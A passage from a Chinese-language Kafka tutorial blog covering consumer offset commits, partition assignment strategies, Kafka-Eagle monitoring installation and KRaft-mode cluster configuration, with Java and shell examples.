KafkaConsumer&lt;&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 订阅主题 first</span></span><br><span class="line">    ArrayList&lt;String&gt; topics = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    topics.add(<span class="string">"first"</span>);</span><br><span class="line">    kafkaConsumer.subscribe(topics);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 订阅主题对应的分区</span></span><br><span class="line">    <span class="comment">//ArrayList&lt;TopicPartition&gt; topicPartitions = new ArrayList&lt;&gt;();</span></span><br><span class="line">    <span class="comment">//topicPartitions.add(new TopicPartition("first",0));</span></span><br><span class="line">    <span class="comment">//kafkaConsumer.assign(topicPartitions);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 消费者组把组id配置成同一个即可，这样就会处理自己监听的分区了</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3 消费数据</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">        ConsumerRecords&lt;String, String&gt; consumerRecords = kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; consumerRecord : consumerRecords) &#123;</span><br><span class="line">            System.out.println(consumerRecord);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        kafkaConsumer.commitAsync();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// bin/kafka-console-producer.sh --bootstrap-server hadoop102:9092 --topic first</span></span><br></pre></td></tr></table></figure><h3 id="3-4-分区的分配以及再平衡">3.4 分区的分配以及再平衡</h3><blockquote><p>具体详见官网:<a href="https://kafka.apache.org/documentation/#consumerapi" target="_blank" rel="noopener" title="https://kafka.apache.org/documentation/#consumerapi">https://kafka.apache.org/documentation/#consumerapi</a></p></blockquote><table><thead><tr><th><strong>参数名称</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><a href="http://heartbeat.interval.ms" target="_blank" rel="noopener">heartbeat.interval.ms</a></td><td>Kafka 消费者和 coordinator 之间的心跳时间，默认 3s。该条目的值必须小于 <a href="http://session.timeout.ms" target="_blank" rel="noopener">session.timeout.ms</a> ， <a href="http://xn--session-3w3kyxxoq96lrw3hqvsb.timeout.ms" target="_blank" rel="noopener">也不应该高于session.timeout.ms</a> 的 1/3。</td></tr><tr><td><a href="http://session.timeout.ms" target="_blank" rel="noopener">session.timeout.ms</a></td><td>Kafka 消费者和 coordinator 之间连接超时时间，默认 45s。超过该值，该消费者被移除，消费者组执行再平衡。</td></tr><tr><td><a href="http://max.poll.interval.ms" target="_blank" rel="noopener">max.poll.interval.ms</a></td><td>消费者处理消息的最大时长，默认是 5 分钟。超过该值，该消费者被移除，消费者组执行再平衡。</td></tr><tr><td>partition.assignment.strategy</td><td>消 费 者 分 区 分 配 策 略 ， 默 认 策 略 是 Range +CooperativeSticky。Kafka 可以同时使用多个分区分配策略。可以选择的策略包括： Range 、 RoundRobin 、 Sticky 、CooperativeSticky</td></tr></tbody></table><p>** Range 以及再平衡**</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335708.png" alt></p><p><strong>RoundRobin 以及再平衡</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202401251335709.png" alt></p><p><strong>Sticky 以及再平衡</strong></p><p>粘性分区定义：可以理解为分配的结果带有“粘性的”。即在执行一次新的分配之前，考虑上一次分配的结果，尽量少的调整分配的变动，可以节省大量的开销。粘性分区是 Kafka 从 0.11.x 版本开始引入这种分配策略，<strong>首先会尽量均衡的放置分区到消费者上面</strong>，在出现同一消费者组内消费者出现问题的时候，会尽量保持原有分配的分区不变化（第一次分配会随机）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.kafka.clients.consumer.RoundRobinAssignor</span></span><br><span class="line"><span class="comment">// 设置分区分配策略</span></span><br><span class="line">properties.put(ConsumerConfig.PARTITION_ASSIGNMENT_STRATEGY_CONFIG,<span class="string">"org.apache.kafka.clients.consumer.StickyAssignor"</span>);</span><br></pre></td></tr></table></figure><h3 id="3-5-offset-位移">3.5 offset 位移</h3><p>从0.9版本开始，consumer默认将offset保存在Kafka一个内置的topic中，该topic为__consumer_offsets。__consumer_offsets 主题里面采用 key 和 value 的方式存储数据。key 是 group.id+topic+分区号，value 就是当前 offset 的值。每隔一段时间，kafka 内部会对这个 topic 进行compact，也就是每个 group.id+topic+分区号就保留最新数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在配置文件 config/consumer.properties 中添加配置 exclude.internal.topics=false，默认是 true，表示不能消费系统主题。为了查看该系统主题数据，所以该参数修改为 false</span></span><br><span class="line"><span class="comment"># 改完后进行分发</span></span><br><span class="line"><span class="comment"># 采用命令行方式，创建一个新的 topic</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --create --topic atguigu --partitions 2 --replication-factor 2</span><br><span class="line"><span class="comment"># 启动生产者往 atguigu 生产数据</span></span><br><span class="line">bin/kafka-console-producer.sh --topic atguigu --bootstrap-server hadoop102:9092</span><br><span class="line"><span class="comment"># 启动消费者消费 atguigu 数据</span></span><br><span class="line"><span class="comment"># 注意：指定消费者组名称，更好观察数据存储位置（key 是 group.id+topic+分区号）</span></span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic atguigu --group <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 查看消费者消费主题__consumer_offsets</span></span><br><span class="line">bin/kafka-console-consumer.sh --topic __consumer_offsets --bootstrap-server hadoop102:9092 --consumer.config config/consumer.properties --formatter <span class="string">"kafka.coordinator.group.GroupMetadataManager\$OffsetsMessageFormatter"</span> --from-beginning</span><br></pre></td></tr></table></figure><p><strong>自动提交 offset</strong></p><p>为了使我们能够专注于自己的业务逻辑，Kafka提供了自动提交offset的功能。自动提交offset的相关参数：</p><ul><li>enable.auto.commit：是否开启自动提交offset功能，默认是true</li><li><a href="http://auto.commit.interval.ms" target="_blank" rel="noopener">auto.commit.interval.ms</a>：自动提交offset的时间间隔，默认是5s</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251335710.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自动提交</span></span><br><span class="line">properties.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提交时间间隔</span></span><br><span class="line">properties.put(ConsumerConfig.AUTO_COMMIT_INTERVAL_MS_CONFIG,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p><strong>手动提交 offset</strong></p><p>手动提交offset的方法有两种：分别是<strong>commitSync（同步提交）和commitAsync（异步提交）</strong>。两者的相同点是，都会将<strong>本次提交的一批数据最高的偏移量提交</strong>；不同点是，<strong>同步提交阻塞当前线程</strong>，一直到提交成功，并且会自动失败重试（由不可控因素导致，也会出现提交失败）；而<strong>异步提交则没有失败重试机制，故有可能提交失败</strong></p><ul><li>commitSync（同步提交）：必须等待offset提交完毕，再去消费下一批数据</li><li>commitAsync（异步提交） ：发送完提交offset请求后，就开始消费下一批数据</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0 配置</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接 bootstrap.servers</span></span><br><span class="line">    properties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG,<span class="string">"hadoop102:9092,hadoop103:9092"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化</span></span><br><span class="line">    properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">    properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置消费者组id</span></span><br><span class="line">    properties.put(ConsumerConfig.GROUP_ID_CONFIG,<span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 手动提交</span></span><br><span class="line">    properties.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG,<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 创建一个消费者  "", "hello"</span></span><br><span class="line">    KafkaConsumer&lt;String, String&gt; kafkaConsumer = <span class="keyword">new</span> KafkaConsumer&lt;&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 订阅主题 first</span></span><br><span class="line">    ArrayList&lt;String&gt; topics = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    topics.add(<span class="string">"first"</span>);</span><br><span class="line">    kafkaConsumer.subscribe(topics);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3 消费数据</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">        ConsumerRecords&lt;String, String&gt; consumerRecords = kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; consumerRecord : consumerRecords) &#123;</span><br><span class="line">            System.out.println(consumerRecord);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 手动提交offset</span></span><br><span class="line">        kafkaConsumer.commitSync();</span><br><span class="line">        kafkaConsumer.commitAsync();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-6-offset其他情况">3.6 offset其他情况</h3><p><strong>auto.offset.reset = earliest | latest | none 默认是 latest</strong>。当 Kafka 中没有初始偏移量（消费者组第一次消费）或服务器上不再存在当前偏移量时（例如该数据已被删除），该怎么办？</p><ul><li>earliest：自动将偏移量重置为最早的偏移量，–from-beginning</li><li>latest（默认值）：自动将偏移量重置为最新偏移量</li><li>none：如果未找到消费者组的先前偏移量，则向消费者抛出异常</li><li>任意指定 offset 位移开始消费</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定位置进行消费</span></span><br><span class="line">Set&lt;TopicPartition&gt; assignment = kafkaConsumer.assignment();</span><br><span class="line"></span><br><span class="line"><span class="comment">//  保证分区分配方案已经制定完毕</span></span><br><span class="line"><span class="keyword">while</span> (assignment.size() == <span class="number">0</span>)&#123;</span><br><span class="line">    kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    assignment = kafkaConsumer.assignment();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定消费的offset</span></span><br><span class="line"><span class="keyword">for</span> (TopicPartition topicPartition : assignment) &#123;</span><br><span class="line">    kafkaConsumer.seek(topicPartition,<span class="number">600</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>指定时间消费</strong></p><p>在生产环境中，会遇到最近消费的几个小时数据异常，想重新按照时间消费。例如要求按照时间消费前一天的数据，怎么处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0 配置信息</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接</span></span><br><span class="line">    properties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG,<span class="string">"hadoop102:9092,hadoop103:9092"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化</span></span><br><span class="line">    properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">    properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 组id</span></span><br><span class="line">    properties.put(ConsumerConfig.GROUP_ID_CONFIG,<span class="string">"test3"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 创建消费者</span></span><br><span class="line">    KafkaConsumer&lt;String, String&gt; kafkaConsumer = <span class="keyword">new</span> KafkaConsumer&lt;&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 订阅主题</span></span><br><span class="line">    ArrayList&lt;String&gt; topics = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    topics.add(<span class="string">"first"</span>);</span><br><span class="line">    kafkaConsumer.subscribe(topics);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定位置进行消费</span></span><br><span class="line">    Set&lt;TopicPartition&gt; assignment = kafkaConsumer.assignment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  保证分区分配方案已经制定完毕</span></span><br><span class="line">    <span class="keyword">while</span> (assignment.size() == <span class="number">0</span>)&#123;</span><br><span class="line">        kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        assignment = kafkaConsumer.assignment();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 希望把时间转换为对应的offset</span></span><br><span class="line">    HashMap&lt;TopicPartition, Long&gt; topicPartitionLongHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装对应集合</span></span><br><span class="line">    <span class="keyword">for</span> (TopicPartition topicPartition : assignment) &#123;</span><br><span class="line">        topicPartitionLongHashMap.put(topicPartition,System.currentTimeMillis() - <span class="number">1</span> * <span class="number">24</span> * <span class="number">3600</span> * <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;TopicPartition, OffsetAndTimestamp&gt; topicPartitionOffsetAndTimestampMap = kafkaConsumer.offsetsForTimes(topicPartitionLongHashMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定消费的offset</span></span><br><span class="line">    <span class="keyword">for</span> (TopicPartition topicPartition : assignment) &#123;</span><br><span class="line"></span><br><span class="line">        OffsetAndTimestamp offsetAndTimestamp = topicPartitionOffsetAndTimestampMap.get(topicPartition);</span><br><span class="line"></span><br><span class="line">        kafkaConsumer.seek(topicPartition,offsetAndTimestamp.offset());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3  消费数据</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">        ConsumerRecords&lt;String, String&gt; consumerRecords = kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; consumerRecord : consumerRecords) &#123;</span><br><span class="line">            System.out.println(consumerRecord);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏消费和重复消费</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202401251335711.png" alt></p><h3 id="3-7-消费者事务">3.7 消费者事务</h3><p>如果想完成Consumer端的精准一次性消费，那么需要Kafka消费端将消费过程和提交offset过程做原子绑定。此时我们需要将Kafka的offset保存到支持事务的自定义介质（比 如MySQL）</p><h3 id="3-8-数据积压（消费者如何提高吞吐量）">3.8 数据积压（消费者如何提高吞吐量）</h3><ul><li>如果是Kafka消费能力不足，则可以考虑增加Topic的分区数，并且同时提升消费组的消费者数量，消费者数 = 分区数。（两者缺一不可）</li><li>如果是下游的数据处理不及时：提高每批次拉取的数量。批次拉取数据过少（拉取数据/处理时间 &lt; 生产速度），使处理的数据小于生产的数据，也会造成数据积压</li></ul><table><thead><tr><th><strong>参数名称</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>fetch.max.bytes</td><td>默认Default: 52428800（50 m）。消费者获取服务器端一批消息最大的字节数。如果服务器端一批次的数据大于该值（50m）仍然可以拉取回来这批数据，因此，这不是一个绝对最大值。一批次的大小受 message.max.bytes （brokerconfig）or max.message.bytes （topic config）影响。</td></tr><tr><td>max.poll.records</td><td>一次 poll 拉取数据返回消息的最大条数，默认是 500 条</td></tr></tbody></table><h2 id="4、Kafka-Eagle-监控">4、Kafka-Eagle 监控</h2><h3 id="4-1-概述与环境准备">4.1 概述与环境准备</h3><p>Kafka-Eagle 框架可以监控 Kafka 集群的整体运行情况，在生产环境中经常使用。Kafka-Eagle 的安装依赖于 MySQL，MySQL 主要用来存储可视化展示的数据。Mysql安装可以参考之前hive的学习笔记</p><h3 id="4-2-Kafka-环境准备">4.2 Kafka 环境准备</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭 Kafka 集群</span></span><br><span class="line">kf.sh stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改/opt/module/kafka/bin/kafka-server-start.sh 命令中</span></span><br><span class="line">vim bin/kafka-server-start.sh</span><br><span class="line"><span class="comment"># 修改如下参数值</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"x<span class="variable">$KAFKA_HEAP_OPTS</span>"</span> = <span class="string">"x"</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">export</span> KAFKA_HEAP_OPTS=<span class="string">"-Xmx1G -Xms1G"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 为</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"x<span class="variable">$KAFKA_HEAP_OPTS</span>"</span> = <span class="string">"x"</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">export</span> KAFKA_HEAP_OPTS=<span class="string">"-server -Xms2G -Xmx2G -XX:PermSize=128m -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:ParallelGCThreads=8 -XX:ConcGCThreads=5 -XX:InitiatingHeapOccupancyPercent=70"</span></span><br><span class="line">  <span class="built_in">export</span> JMX_PORT=<span class="string">"9999"</span></span><br><span class="line">  <span class="comment">#export KAFKA_HEAP_OPTS="-Xmx1G -Xms1G"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：修改之后在启动 Kafka 之前要分发之其他节点</span></span><br><span class="line">xsync kafka-server-start.sh</span><br><span class="line">kf.sh start</span><br></pre></td></tr></table></figure><h3 id="4-3-Kafka-Eagle-安装">4.3  Kafka-Eagle 安装</h3><blockquote><p>官网：<a href="https://www.kafka-eagle.org/" target="_blank" rel="noopener" title="https://www.kafka-eagle.org/">https://www.kafka-eagle.org/</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/smartloli/kafka-eagle-bin/archive/v3.0.1.tar.gz</span><br><span class="line">tar -zxvf v3.0.1.tar.gz</span><br><span class="line"><span class="built_in">cd</span> kafka-eagle-bin-3.0.1/</span><br><span class="line">tar -zxvf efak-web-3.0.1-bin.tar.gz -C /opt/module/</span><br><span class="line">mv efak-web-3.0.1/ efak</span><br><span class="line"><span class="comment"># 进入后修改配置</span></span><br><span class="line">vim system-config.properties</span><br><span class="line"><span class="comment"># 自己按需修改，主要修改三个地方，这是单机单kafka集群</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">efak.zk.cluster.alias=cluster1</span><br><span class="line">cluster1.zk.list=hadoop102:2181,hadoop103:2181,hadoop104:2181/kafka</span><br><span class="line"><span class="comment">#cluster2.zk.list=xdn10:2181,xdn11:2181,xdn12:2181</span></span><br><span class="line"><span class="comment"># kafka offset storage</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">cluster1.efak.offset.storage=kafka</span><br><span class="line"><span class="comment">#cluster2.efak.offset.storage=zk</span></span><br><span class="line"><span class="comment"># kafka mysql jdbc driver address</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">efak.driver=com.mysql.cj.jdbc.Driver</span><br><span class="line">efak.url=jdbc:mysql://127.0.0.1:3306/ke?useUnicode=<span class="literal">true</span>&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull</span><br><span class="line">efak.username=root</span><br><span class="line">efak.password=123456</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加环境变量</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># kafkaEFAK</span></span><br><span class="line"><span class="built_in">export</span> KE_HOME=/opt/module/efak</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$KE_HOME</span>/bin</span><br><span class="line"><span class="comment"># 注意：刷新环境变量</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动，启动之前需要先启动 ZK 以及 KAFKA</span></span><br><span class="line">kf.sh start</span><br><span class="line">bin/ke.sh start</span><br><span class="line"><span class="comment"># 说明：如果停止 efak，执行命令</span></span><br><span class="line">bin/ke.sh stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://hadoop102:8048/ 访问</span></span><br><span class="line"><span class="comment"># 用户名密码admin/123456</span></span><br></pre></td></tr></table></figure><h2 id="5、Kafka-Kraft-模式">5、Kafka-Kraft 模式</h2><h3 id="5-1-Kafka-Kraft-架构">5.1  Kafka-Kraft 架构</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251335712.png" alt></p><p>左图为 Kafka 现有架构，元数据在 zookeeper 中，运行时动态选举 controller，由controller 进行 Kafka 集群管理。右图为 kraft 模式架构（实验性），不再依赖zookeeper 集群，而是用三台 controller 节点代替 zookeeper，元数据保存在 controller 中，由 controller 直接进行 Kafka 集群管理。这样做的好处有以下几个：</p><ul><li>Kafka 不再依赖外部框架，而是能够独立运行；</li><li>controller 管理集群时，不再需要从 zookeeper 中先读取数据，集群性能上升；</li><li>由于不依赖 zookeeper，集群扩展时不再受到 zookeeper 读写能力限制；</li><li>controller 不再动态选举，而是由配置文件规定。这样我们可以有针对性的加强controller 节点的配置，而不是像以前一样对随机 controller 节点的高负载束手无策</li></ul><h3 id="5-2-Kafka-Kraft-集群部署">5.2 Kafka-Kraft 集群部署</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 再次解压一份 kafka 安装包</span></span><br><span class="line">tar -zxvf kafka_2.12-3.0.0.tgz -C /opt/module/</span><br><span class="line">mv kafka_2.12-3.0.0/ kafka2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 hadoop102 上修改/opt/module/kafka2/config/kraft/server.properties 配置文件</span></span><br><span class="line">vim server.properties</span><br><span class="line"><span class="comment">#kafka 的角色（controller 相当于主机、broker 节点相当于从机，主机类似 zk 功能）</span></span><br><span class="line">process.roles=broker, controller</span><br><span class="line"><span class="comment">#节点 ID,全局唯一</span></span><br><span class="line">node.id=2</span><br><span class="line"><span class="comment">#controller 服务协议别名</span></span><br><span class="line">controller.listener.names=CONTROLLER</span><br><span class="line"><span class="comment">#全 Controller 列表</span></span><br><span class="line">controller.quorum.voters=2@hadoop102:9093,3@hadoop103:9093,4@hadoop104:9093</span><br><span class="line"><span class="comment">#不同服务器绑定的端口</span></span><br><span class="line">listeners=PLAINTEXT://:9092,CONTROLLER://:9093</span><br><span class="line"><span class="comment">#broker 服务协议别名</span></span><br><span class="line">inter.broker.listener.name=PLAINTEXT</span><br><span class="line"><span class="comment">#broker 对外暴露的地址</span></span><br><span class="line">advertised.Listeners=PLAINTEXT://hadoop102:9092</span><br><span class="line"><span class="comment">#协议别名到安全协议的映射</span></span><br><span 